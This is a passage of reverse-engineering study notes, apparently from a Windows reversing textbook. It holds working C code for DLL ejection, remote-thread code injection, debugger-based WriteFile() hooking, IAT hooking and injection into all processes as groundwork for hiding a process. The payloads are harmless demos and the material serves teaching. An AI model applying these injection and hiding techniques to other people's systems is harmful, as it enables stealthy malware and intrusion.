(LPTSTR)(LPCTSTR)szCmd,                             NULL, NULL, FALSE,                             NORMAL_PRIORITY_CLASS,                             NULL, NULL, &amp;si, &amp;pi) )            break;        if( pi.hProcess != NULL )            CloseHandle(pi.hProcess);        break;    &#125;       return TRUE;&#125;\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\nSetWindowsHookEx()Chapter 24 - DLL EjectionThis technique is similar to DLL injection. Instead of using LoadLibrary() to load a DLL, we use FreeLibrary() to unload a DLL via CreateRemoteThread().\nEvery Windows kernel object has a reference count, which indicates how many references to the object currently exist. For example, the reference count of a.dll becomes 10 if LoadLibrary(&quot;a.dll&quot;) is called 10 times. Accordingly, FreeLibrary() must be called 10 times to fully unload a.dll.\nThe reference count is decreased by 1 whenever FreeLibrary() is called. Therefore, we need to pay attention to the value of the reference count.\nChapter 25 - Load DLL File by Modifying the PE File// EjectDll.exe#include &quot;windows.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;#define DEF_PROC_NAME\t(L&quot;notepad.exe&quot;)#define DEF_DLL_NAME\t(L&quot;myhack.dll&quot;)DWORD FindProcessID(LPCTSTR szProcessName)&#123;    DWORD dwPID = 0xFFFFFFFF;    HANDLE hSnapShot = INVALID_HANDLE_VALUE;    PROCESSENTRY32 pe;    // Get the snapshot of the system    pe.dwSize = sizeof( PROCESSENTRY32 );    hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );    // find process    Process32First(hSnapShot, &amp;pe);    do    &#123;        if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))        &#123;            dwPID = pe.th32ProcessID;            break;        &#125;    &#125;    while(Process32Next(hSnapShot, &amp;pe));    CloseHandle(hSnapShot);    return dwPID;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system                              lpszPrivilege,  // privilege to lookup                               &amp;luid) )        // receives LUID of privilege    &#123;        _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)&#123;    BOOL bMore = FALSE, bFound = FALSE;    HANDLE hSnapshot, hProcess, hThread;    HMODULE hModule = NULL;    MODULEENTRY32 me = &#123; sizeof(me) &#125;;    LPTHREAD_START_ROUTINE pThreadProc;    // dwPID = notepad 프로세스 ID    // TH32CS_SNAPMODULE 파라미터를 이용해서 notepad 프로세스에 로딩된 DLL 이름을 얻음    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);    bMore = Module32First(hSnapshot, &amp;me);    for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )    &#123;        if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) ||             !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )        &#123;            bFound = TRUE;            break;        &#125;    &#125;    if( !bFound )    &#123;        CloseHandle(hSnapshot);        return FALSE;    &#125;    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError());        return FALSE;    &#125;    hModule = GetModuleHandle(L&quot;kernel32.dll&quot;);    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;);    hThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, me.modBaseAddr,                                  0, NULL);    WaitForSingleObject(hThread, INFINITE);\t    CloseHandle(hThread);    CloseHandle(hProcess);    CloseHandle(hSnapshot);    return TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    DWORD dwPID = 0xFFFFFFFF;     // find process    dwPID = FindProcessID(DEF_PROC_NAME);    if( dwPID == 0xFFFFFFFF )    &#123;        _tprintf(L&quot;There is no &lt;%s&gt; process!\\n&quot;, DEF_PROC_NAME);        return 1;    &#125;    _tprintf(L&quot;PID of \\&quot;%s\\&quot; is %d\\n&quot;, DEF_PROC_NAME, dwPID);    // change privilege    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )        return 1;    // eject dll    if( EjectDll(dwPID, DEF_DLL_NAME) )        _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) success!!!\\n&quot;, dwPID, DEF_DLL_NAME);    else        _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) failed!!!\\n&quot;, dwPID, DEF_DLL_NAME);    return 0;&#125;\ntypedef struct tagMODULEENTRY32 &#123;    DWORD   dwSize;    DWORD   th32ModuleID;    DWORD   th32ProcessID;    DWORD   GlblcntUsage;    DWORD   ProccntUsage;    BYTE    *modBaseAddr;    DWORD   modBaseSize;    HMODULE hModule;    char    szModule[MAX_MODULE_NAME32 + 1];    char    szExePath[MAX_PATH];&#125; MODULEENTRY32;\nChapter 26 - PE ToolsChapter 27 - Code Injection27.4 - CodeInjection.cppMsgBox()//MsgBox.cpp#include &quot;windows.h&quot;DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    MessageBoxA(NULL, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, MB_OK);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    switch( fdwReason )    &#123;        case DLL_PROCESS_ATTACH :             CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);            break;    &#125;    return TRUE;&#125;main()int main(int argc, char *argv[])&#123;    DWORD dwPID     = 0;\tif( argc != 2 )\t&#123;\t    printf(&quot;\\n USAGE  : %s &lt;pid&gt;\\n&quot;, argv[0]);\t\treturn 1;\t&#125;\t// change privilege\tif( !SetPrivilege(SE_DEBUG_NAME, TRUE) )        return 1;    // code injection    dwPID = (DWORD)atol(argv[1]);    InjectCode(dwPID);\treturn 0;&#125;ThreadProc()typedef struct _THREAD_PARAM &#123;    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()    char    szBuf[4][128];          // &quot;user32.dll&quot;, &quot;MessageBoxA&quot;, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;&#125; THREAD_PARAM, *PTHREAD_PARAM;typedef HMODULE (WINAPI *PFLOADLIBRARYA)(    LPCSTR lpLibFileName);typedef FARPROC (WINAPI *PFGETPROCADDRESS)(    HMODULE hModule,    LPCSTR lpProcName);typedef int (WINAPI *PFMESSAGEBOXA)(    HWND hWnd,    LPCSTR lpText,    LPCSTR lpCaption,    UINT uType);DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;    HMODULE         hMod        = NULL;    FARPROC         pFunc       = NULL;    // LoadLibrary()    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // &quot;user32.dll&quot;    if( !hMod )        return 1;    // GetProcAddress()    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // &quot;MessageBoxA&quot;    if( !pFunc )        return 1;    // MessageBoxA()    ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);    return 0;&#125;InjectCode()BOOL InjectCode(DWORD dwPID)&#123;    HMODULE         hMod            = NULL;    THREAD_PARAM    param           = &#123;0,&#125;;    HANDLE          hProcess        = NULL;    HANDLE          hThread         = NULL;    LPVOID          pRemoteBuf[2]   = &#123;0,&#125;;    DWORD           dwSize          = 0;    hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);    // set THREAD_PARAM    param.pFunc[0] = GetProcAddress(hMod, &quot;LoadLibraryA&quot;);    param.pFunc[1] = GetProcAddress(hMod, &quot;GetProcAddress&quot;);    strcpy_s(param.szBuf[0], &quot;user32.dll&quot;);    strcpy_s(param.szBuf[1], &quot;MessageBoxA&quot;);    strcpy_s(param.szBuf[2], &quot;www.reversecore.com&quot;);    strcpy_s(param.szBuf[3], &quot;ReverseCore&quot;);    // Open Process    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   // dwDesiredAccess                                  FALSE,                // bInheritHandle                                  dwPID)) )             // dwProcessId    &#123;        printf(&quot;OpenProcess() fail : err_code = %d\\n&quot;, GetLastError());        return FALSE;    &#125;    // Allocation for THREAD_PARAM    dwSize = sizeof(THREAD_PARAM);    if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess,          // hProcess                                      NULL,                 // lpAddress                                      dwSize,               // dwSize                                      MEM_COMMIT,           // flAllocationType                                      PAGE_READWRITE)) )    // flProtect    &#123;        printf(&quot;VirtualAllocEx() fail : err_code = %d\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !WriteProcessMemory(hProcess,                       // hProcess                            pRemoteBuf[0],                  // lpBaseAddress                            (LPVOID)&amp;param,                 // lpBuffer                            dwSize,                         // nSize                            NULL) )                         // [out] lpNumberOfBytesWritten    &#123;        printf(&quot;WriteProcessMemory() fail : err_code = %d\\n&quot;, GetLastError());        return FALSE;    &#125;    // Allocation for ThreadProc()    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;    if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess,          // hProcess                                      NULL,                 // lpAddress                                      dwSize,               // dwSize                                      MEM_COMMIT,           // flAllocationType                                      PAGE_EXECUTE_READWRITE)) )    // flProtect    &#123;        printf(&quot;VirtualAllocEx() fail : err_code = %d\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !WriteProcessMemory(hProcess,                       // hProcess                            pRemoteBuf[1],                  // lpBaseAddress                            (LPVOID)ThreadProc,             // lpBuffer                            dwSize,                         // nSize                            NULL) )                         // [out] lpNumberOfBytesWritten    &#123;        printf(&quot;WriteProcessMemory() fail : err_code = %d\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !(hThread = CreateRemoteThread(hProcess,            // hProcess                                       NULL,                // lpThreadAttributes                                       0,                   // dwStackSize                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[1],     // dwStackSize                                       pRemoteBuf[0],       // lpParameter                                       0,                   // dwCreationFlags                                       NULL)) )             // lpThreadId    &#123;        printf(&quot;CreateRemoteThread() fail : err_code = %d\\n&quot;, GetLastError());        return FALSE;    &#125;    WaitForSingleObject(hThread, INFINITE);\t    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system                              lpszPrivilege,  // privilege to lookup                               &amp;luid) )        // receives LUID of privilege    &#123;        printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        printf(&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;\nChapter 28 - Code Injection via Assembly Code\n\n\n\n\n\nChapter 29 - API Hooking\n    \n    Source: https://maple19out.tistory.com/45\n    \n\n\nChapter 30 - API Hooking of Notepad.exe WriteFile()Debug Events\nEXCEPTION_DEBUG_EVENT\nCREATE_THREAD_DEBUG_EVENT\nCREATE_PROCESS_DEBUG_EVENT\nEXIT_THREAD_DEBUG_EVENT\nEXIT_PROCESS_DEBUG_EVENT\nLOAD_DLL_DEBUG_EVENT\nUNLOAD_DLL_DEBUG_EVENT\nOUTPUT_DEBUT_STRING_EVENT\nRIP_EVENT\n\nEXCEPTION_DEBUG_EVENT\nEXCEPTION_ACCESS_VIOLATION\nEXCEPTION_ARRAY_BOUNDS_EXCEEDED\nEXCEPTION_BREAKPOINT\nEXCEPTION_DATATYPE_MISALIGNMENT\nEXCEPTION_FLT_DENORMAL_OPERAND\nEXCEPTION_FLT_DIVIDE_BY_ZERO\nEXCEPTION_FLT_INEXACT_RESULT\nEXCEPTION_FLT_INVALID_OPERATION\nEXCEPTION_FLT_OVERFLOW\nEXCEPTION_FLT_STACK_CHECK\nEXCEPTION_FLT_UNDERFLOW\nEXCEPTION_FLT_ILLEGAL_INSTRUCTIOIN\nEXCEPTION_IN_PAGE_ERROR\nEXCEPTION_INT_DIVIDE_BY_ZERO\nEXCEPTION_INT_OVERFLOW\nEXCEPTION_INVALID_DISPOSITION\nEXCEPTION_NONCONTINUABLE_EXCEPTION\nEXCEPTION_PRIV_INSTRUCTION\nEXCEPTION_SINGLE_STEP\nEXCEPTION_STACK_OVERFLOW\n\n30.4 - Practice30.5 - PrincipleWriteFile()BOOL WriteFile(  [in]                HANDLE       hFile,  [in]                LPCVOID      lpBuffer,  [in]                DWORD        nNumberOfBytesToWrite,  [out, optional]     LPDWORD      lpNumberOfBytesWritten,  [in, out, optional] LPOVERLAPPED lpOverlapped);\n\nmain()int main(int argc, char* argv[])&#123;    DWORD dwPID;    if( argc != 2 )    &#123;        printf(&quot;\\nUSAGE : hookdbg.exe &lt;pid&gt;\\n&quot;);        return 1;    &#125;    //Attach Process    dwPID = atoi(argv[1]);    if( !DebugActiveProcess(dwPID) )    &#123;        printf(&quot;DebugActiveProcess(%d) failed!!!\\n&quot;               &quot;Error Code = %d\\n&quot;, dwPID, GetLastError());        return 1;    &#125;    //Debugger loop    DebugLoop();    return 0;&#125;\nDebugLoop()void DebugLoop()&#123;    DEBUG_EVENT de;    DWORD dwContinueStatus;    //Waiting for debuggee event.    while( WaitForDebugEvent(&amp;de, INFINITE) )    &#123;        dwContinueStatus = DBG_CONTINUE;        //Debuggee process is created or attached.        if( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )        &#123;            OnCreateProcessDebugEvent(&amp;de);        &#125;        //Exception        else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )        &#123;            if( OnExceptionDebugEvent(&amp;de) )                continue;        &#125;        //Event of debuggee is terminated.        else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )        &#123;            // debuggee 종료 -&gt; debugger 종료            break;        &#125;        //Continue debuggee.        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);    &#125;&#125;\nDEBUG_EVENT structuretypedef struct _DEBUG_EVENT &#123;  DWORD dwDebugEventCode;  DWORD dwProcessId;  DWORD dwThreadId;  union &#123;    EXCEPTION_DEBUG_INFO      Exception;    CREATE_THREAD_DEBUG_INFO  CreateThread;    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;    EXIT_THREAD_DEBUG_INFO    ExitThread;    EXIT_PROCESS_DEBUG_INFO   ExitProcess;    LOAD_DLL_DEBUG_INFO       LoadDll;    UNLOAD_DLL_DEBUG_INFO     UnloadDll;    OUTPUT_DEBUG_STRING_INFO  DebugString;    RIP_INFO                  RipInfo;  &#125; u;&#125; DEBUG_EVENT, *LPDEBUG_EVENT;//Source: https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event\nOnCreateProcessDebugEvent()BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)&#123;    // WriteFile() API 주소 구하기    g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;);    // API Hook - WriteFile()    //   첫 번째 byte 를 0xCC (INT 3) 으로 변경     //   (orginal byte 는 백업)    memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO));    ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile,                       &amp;g_chOrgByte, sizeof(BYTE), NULL);    WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,                        &amp;g_chINT3, sizeof(BYTE), NULL);    return TRUE;&#125;\nOnExceptionDebugEvent()BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)&#123;    CONTEXT ctx;    PBYTE lpBuffer = NULL;    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;    //BreakPoint exception (INT 3)    if( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode )    &#123;        //if BP address is the address of WriteFile()        if( g_pfWriteFile == per-&gt;ExceptionAddress )        &#123;            // #1. Unhook            //0xCC -&gt; original byte            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,                                &amp;g_chOrgByte, sizeof(BYTE), NULL);            // #2. Thread Context            ctx.ContextFlags = CONTEXT_CONTROL;            GetThreadContext(g_cpdi.hThread, &amp;ctx);            // #3. WriteFile(), param 2, 3            //   함수의 파라미터는 해당 프로세스의 스택에 존재함            //   param 2 : ESP + 0x8            //   param 3 : ESP + 0xC            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8),                               &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0xC),                               &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL);            // #4. 임시 버퍼 할당            lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1);            memset(lpBuffer, 0, dwNumOfBytesToWrite+1);            // #5. WriteFile() 의 버퍼를 임시 버퍼에 복사            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,                               lpBuffer, dwNumOfBytesToWrite, NULL);            printf(&quot;\\n### original string ###\\n%s\\n&quot;, lpBuffer);            // #6. 소문자 -&gt; 대문자 변환            for( i = 0; i &lt; dwNumOfBytesToWrite; i++ )            &#123;                if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A )                    lpBuffer[i] -= 0x20;            &#125;            printf(&quot;\\n### converted string ###\\n%s\\n&quot;, lpBuffer);            // #7. 변환된 버퍼를 WriteFile() 버퍼로 복사            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,                                lpBuffer, dwNumOfBytesToWrite, NULL);                        // #8. 임시 버퍼 해제            free(lpBuffer);            // #9. Thread Context 의 EIP 를 WriteFile() 시작으로 변경            //   (현재는 WriteFile() + 1 만큼 지나왔음)            ctx.Eip = (DWORD)g_pfWriteFile;            SetThreadContext(g_cpdi.hThread, &amp;ctx);            // #10. Debuggee 프로세스를 진행시킴            ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);            Sleep(0);            // #11. API Hook            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,                                &amp;g_chINT3, sizeof(BYTE), NULL);            return TRUE;        &#125;    &#125;    return FALSE;&#125;CONTEXT (x86 32-bit)typedef struct _CONTEXT &#123;  DWORD              ContextFlags;  DWORD              Dr0;  DWORD              Dr1;  DWORD              Dr2;  DWORD              Dr3;  DWORD              Dr6;  DWORD              Dr7;  FLOATING_SAVE_AREA FloatSave;  DWORD              SegGs;  DWORD              SegFs;  DWORD              SegEs;  DWORD              SegDs;  DWORD              Edi;  DWORD              Esi;  DWORD              Ebx;  DWORD              Edx;  DWORD              Ecx;  DWORD              Eax;  DWORD              Ebp;  DWORD              Eip;  DWORD              SegCs;  DWORD              EFlags;  DWORD              Esp;  DWORD              SegSs;  BYTE               ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT;\nChapter 31 - DebuggerOllyDbgIDA ProWinDbgChapter 32 - Displaying Korean in calc.exe\n\n\nBOOL SetWindowTextA(  [in]           HWND   hWnd,  [in, optional] LPCSTR lpString);//Source: https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-setwindowtexta\nHere W stands for Wide Character version. A stands for ASCII version.\n\n\n\n\n\n\n\n\n\n\n\n\n\nImportant: Notice that Little-endian is used on x32 platform. Thus, you must enter the hexadecimal unicode in reversed. In addition, Unicode is constituted by 2 bytes (16 bits).\n\n32.4 - Practice&gt; InjectDll.exe -e 3192 C:\\work\\hookiat.dll\n32.5 - CodeDllMain()BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;\tswitch( fdwReason )\t&#123;\t\tcase DLL_PROCESS_ATTACH :             // original API 주소 저장           \tg_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;),                                         &quot;SetWindowTextW&quot;);            // # hook            //   user32!SetWindowTextW() 를 hookiat!MySetWindowText() 로 후킹\t\t\thook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\t\t\tbreak;\t\tcase DLL_PROCESS_DETACH :            // # unhook            //   calc.exe 의 IAT 를 원래대로 복원            hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\t\t\tbreak;\t&#125;\treturn TRUE;&#125;MySetWindowTextW()BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123;    wchar_t* pNum = L&quot;영일이삼사오육칠팔구&quot;; //0123456789 or 零一二三四五六七八九    wchar_t temp[2] = &#123;0,&#125;;    int i = 0, nLen = 0, nIndex = 0;    nLen = wcslen(lpString);    for(i = 0; i &lt; nLen; i++)    &#123;        // &#x27;수&#x27;문자를 &#x27;한글&#x27;문자로 변환        //   lpString 은 wide-character (2 byte) 문자열        if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; )        &#123;            temp[0] = lpString[i];            nIndex = _wtoi(temp);            lpString[i] = pNum[nIndex];        &#125;    &#125;    // user32!SetWindowTextW() API 호출    //   (위에서 lpString 버퍼 내용을 변경하였음)    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125;\n\nhook_iat()BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123;\tHMODULE hMod;\tLPCSTR szLibName;\tPIMAGE_IMPORT_DESCRIPTOR pImportDesc; \tPIMAGE_THUNK_DATA pThunk;\tDWORD dwOldProtect, dwRVA;\tPBYTE pAddr;    // hMod, pAddr = ImageBase of calc.exe    //             = VA to MZ signature (IMAGE_DOS_HEADER)\thMod = GetModuleHandle(NULL);\tpAddr = (PBYTE)hMod;    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)\tpAddr += *((DWORD*)&amp;pAddr[0x3C]);    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\tdwRVA = *((DWORD*)&amp;pAddr[0x80]);    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\tpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\tfor( ; pImportDesc-&gt;Name; pImportDesc++ )\t&#123;        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\t\tszLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);\t\tif( !_stricmp(szLibName, szDllName) )\t\t&#123;            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk            //        = VA to IAT(Import Address Table)\t\t\tpThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +                                          pImportDesc-&gt;FirstThunk);            // pThunk-&gt;u1.Function = VA to API\t\t\tfor( ; pThunk-&gt;u1.Function; pThunk++ )\t\t\t&#123;\t\t\t\tif( pThunk-&gt;u1.Function == (DWORD)pfnOrg )\t\t\t\t&#123;                    //Modify the attribute of memory to E/R/W\t\t\t\t\tVirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    PAGE_EXECUTE_READWRITE,                                    &amp;dwOldProtect);                    //Modify IAT value (Hooking).                    pThunk-&gt;u1.Function = (DWORD)pfnNew;\t\t\t\t\t                    //Redo modification.                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    dwOldProtect,                                    &amp;dwOldProtect);\t\t\t\t\t\t\t\t\t\t\treturn TRUE;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn FALSE;&#125;\n\nIAT structurehMod = GetModuleHandle(NULL);       // hMod = ImageBasepAddr = (PBYTE)hMod;                // pAddr = ImageBasepAddr += *((DWORD*)&amp;pAddr[0x3C]);   // pAddr = &quot;PE&quot; signaturedwRVA = *((DWORD*)&amp;pAddr[0x80]);    // dwRVA = RVA of IMAGE_IMPORT_DESCRIPTORpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\nChapter 33 - Hidden Process33.3 - Hidden ProcessCreateToolhelp32Snapshot()HANDLE CreateToolhelp32Snapshot(  [in] DWORD dwFlags,  [in] DWORD th32ProcessID);//Source: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot\nEnumProcess()\nBOOL EnumProcesses(  [out] DWORD   *lpidProcess,  [in]  DWORD   cb,  [out] LPDWORD lpcbNeeded);//Source: https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessesZwQuerySystemInformation()NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);//Source: https://learn.microsoft.com/en-us/windows/win32/sysinfo/zwquerysysteminformation\n33.4 - PracticeBOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)&#123;\tDWORD                   dwPID = 0;\tHANDLE                  hSnapShot = INVALID_HANDLE_VALUE;\tPROCESSENTRY32          pe;\t// Get the snapshot of the system\tpe.dwSize = sizeof( PROCESSENTRY32 );\thSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );\t// find process\tProcess32First(hSnapShot, &amp;pe);\tdo\t&#123;\t\tdwPID = pe.th32ProcessID;        // 시스템의 안정성을 위해서        // PID 가 100 보다 작은 시스템 프로세스에 대해서는        // DLL Injection 을 수행하지 않는다.\t\tif( dwPID &lt; 100 )\t\t\tcontinue;        if( nMode == INJECTION_MODE )\t\t    InjectDll(dwPID, szDllPath);        else            EjectDll(dwPID, szDllPath);\t&#125;\twhile( Process32Next(hSnapShot, &amp;pe) );\tCloseHandle(hSnapShot);\treturn TRUE;&#125;\n33.5 - HideProcChapter 34 - Global API HookingChapter 35 - How to Choose Your ToolsChapter 36 - 64-bit36.1 - 64-bit Processing\n\n\n\nTerminology\nMeaning\n\n\n\n\nAMB64\n64-bit processors developed by AMD.\n\n\nEM64T\n64-bit processors developed by Intel. They support AMD64.\n\n\nIntel64\nNew name of EM64T.\n\n\nIA-64\n64-bit CPUs developed by Intel and HP.\n\n\nx86\nCPUs of Intel IA-32, IA-16 and IA-8.\n\n\nx64\nAMD64 &amp; Intel64\n\n\n\n\nChapter 37 - x64 ProcessorChapter 38 - PE32+IMAGE_NT_HEADERStypedef struct _IMAGE_NT_HEADERS64 &#123;  DWORD Signature;  IMAGE_FILE_HEADER FileHeader;  IMAGE_OPTIONAL_HEADER64 OptionalHeader;&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;typedef struct _IMAGE_NT_HEADERS &#123;  DWORD Signature; /* &quot;PE&quot;\\0\\0 */\t/* 0x00 */  IMAGE_FILE_HEADER FileHeader;\t\t/* 0x04 */  IMAGE_OPTIONAL_HEADER32 OptionalHeader;\t/* 0x18 */&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;#ifdef _WIN64typedef IMAGE_NT_HEADERS64  IMAGE_NT_HEADERS;typedef PIMAGE_NT_HEADERS64 PIMAGE_NT_HEADERS;#elsetypedef IMAGE_NT_HEADERS32  IMAGE_NT_HEADERS;typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS;#endif//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\n\nIMAGE_FILE_HEADER#define IMAGE_FILE_MACHINE_UNKNOWN      0#define IMAGE_FILE_MACHINE_TARGET_HOST  0x0001#define IMAGE_FILE_MACHINE_I386         